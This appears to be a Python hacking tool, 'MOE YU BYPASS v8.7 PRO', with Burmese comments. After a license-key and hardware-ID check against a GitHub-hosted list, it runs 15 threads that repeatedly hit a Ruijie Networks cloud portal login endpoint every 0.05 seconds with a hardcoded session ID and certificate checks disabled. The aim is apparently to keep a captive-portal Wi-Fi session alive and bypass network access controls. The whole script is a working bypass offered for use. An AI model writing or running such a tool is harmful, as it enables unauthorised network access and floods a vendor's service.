import requests, re, urllib3, time, threading, sys, datetime, os, uuid, socket, random
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# အစ်ကိုပို့ပေးသော Session ID ကို ဒီမှာ အသေထည့်ထားပါသည်
TARGET_SID = "7f3ac1f1899b42d4bf4e296cc5ff009c"
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

# COLOR SYSTEM
RED, GREEN, CYAN, YELLOW, RESET = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[0m"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]"""

# ===============================
# LICENSE SYSTEM
# ===============================
def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-998A7F92-675"

def check_license():
    my_hwid = get_hwid()
    os.system('clear')
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[red]DEVICE INFO[/red]", border_style="cyan", expand=False)))
    
    user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    if not user_key: sys.exit()
    
    try:
        res = requests.get(URL, timeout=10)
        for entry in res.text.splitlines():
            parts = entry.split("|")
            if user_key == parts[0].strip():
                # HWID စစ်ဆေးခြင်း
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    print(f"{RED}❌ HWID MISMATCH!{RESET}")
                    sys.exit()
                
                print(f"\n{GREEN}>>> AUTHENTICATION SUCCESS{RESET}")
                print(f"      {YELLOW}EXPIRY: Lifetime{RESET}\n")
                return True
        print(f"{RED}❌ INVALID KEY!{RESET}")
        sys.exit()
    except:
        print(f"{RED}📡 CONNECTION ERROR!{RESET}")
        sys.exit()

# ===============================
# BYPASS ENGINE
# ===============================
def start_bypass():
    # Cloud Login API လိပ်စာ
    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={TARGET_SID}"
    
    def pulse():
        while True:
            try:
                # Cloud Server ဆီသို့ အမြန်နှုန်းမြှင့် Request ပို့ခြင်း
                requests.get(auth_link, timeout=10, verify=False)
                # အမှန်ခြစ်လေးများ ပြသခြင်း
                sys.stdout.write(f"{GREEN}[✓] CLOUD-INJECT | SID: {TARGET_SID[:15]}... | ACTIVE{RESET}\n")
                sys.stdout.flush()
            except: pass
            time.sleep(0.05) # Pulse Speed မြှင့်ထားသည်

    console.print(Panel.fit(f"[bold red]🔥 MOE YU BYPASS v8.7 PRO ACTIVATED 🔥[/bold red]\n[white]Target SID: {TARGET_SID}[/white]", border_style="white"))
    
    # Threads အများအပြားဖြင့် စတင်ခြင်း
    for _ in range(15):
        threading.Thread(target=pulse, daemon=True).start()
    
    while True:
        time.sleep(10)

if __name__ == "__main__":
    if check_license():
        try:
            start_bypass()
        except KeyboardInterrupt:
            sys.exit()
